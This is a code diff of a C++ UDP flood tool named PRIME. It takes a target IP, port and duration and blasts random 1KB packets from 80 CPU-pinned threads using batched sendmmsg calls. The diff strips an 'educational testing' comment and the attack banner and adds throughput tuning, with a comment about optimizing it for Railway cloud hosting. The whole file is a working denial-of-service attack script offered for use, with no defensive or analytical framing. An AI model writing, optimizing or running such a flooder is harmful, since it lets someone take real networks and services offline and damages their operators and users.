@@ -1,48 +1,77 @@
+#define _GNU_SOURCE
 #include <iostream>
 #include <vector>
 #include <thread>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <cstring>
+#include <ctime>
+#include <sys/socket.h>
+#include <sched.h>
 
 using namespace std;
 
-// Basic UDP Flood Logic for Educational Testing
+// Performance Config
+#define PACKET_SIZE 1024
+#define VLEN 64             // Batch size (Extreme speed)
+#define THREAD_COUNT 80     // Railway optimized
+
 void attack(string ip, int port, int duration) {
+    // CPU Core Pinning: Har thread ko alag core par distribute karega
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(rand() % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());
+    if (sock < 0) return;
 
-    char buffer[1024]; // 1KB Packet size
+    // Socket Buffer Maximize
+    int sndbuf = 1024 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(ip.c_str());
+
+    // Soul-Logic: Batch Preparation
+    struct mmsghdr msgs[VLEN];
+    struct iovec iovecs[VLEN];
+    char buffers[VLEN][PACKET_SIZE];
+
+    for (int i = 0; i < VLEN; i++) {
+        for (int j = 0; j < PACKET_SIZE; j++) buffers[i][j] = (char)(rand() % 256);
+        iovecs[i].iov_base = buffers[i];
+        iovecs[i].iov_len = PACKET_SIZE;
+        msgs[i].msg_hdr.msg_iov = &iovecs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_name = &addr;
+        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
+    }
+
     time_t end = time(NULL) + duration;
-
     while (time(NULL) < end) {
-        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        // High-Speed Multi-Message Sending
+        sendmmsg(sock, msgs, VLEN, 0);
     }
     close(sock);
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        cout << "Usage: ./PRIME <IP> <PORT> <TIME>" << endl;
-        return 1;
-    }
+    if (argc != 4) return 1;
+    
+    srand(time(NULL));
+    string ip = argv[1];
+    int port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
 
-    string target_ip = argv[1];
-    int target_port = stoi(argv[2]);
-    int duration = stoi(argv[3]);
-
-    cout << "🚀 PRIMEXARMY Attack Started on " << target_ip << endl;
-
-    // Multi-threading for more power
     vector<thread> threads;
-    for (int i = 0; i < 100; i++) { // 100 Threads
-        threads.push_back(thread(attack, target_ip, target_port, duration));
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        threads.push_back(thread(attack, ip, port, duration));
     }
 
     for (auto &t : threads) t.join();
-
-    cout << "✅ Attack Finished." << endl;
     return 0;
 }
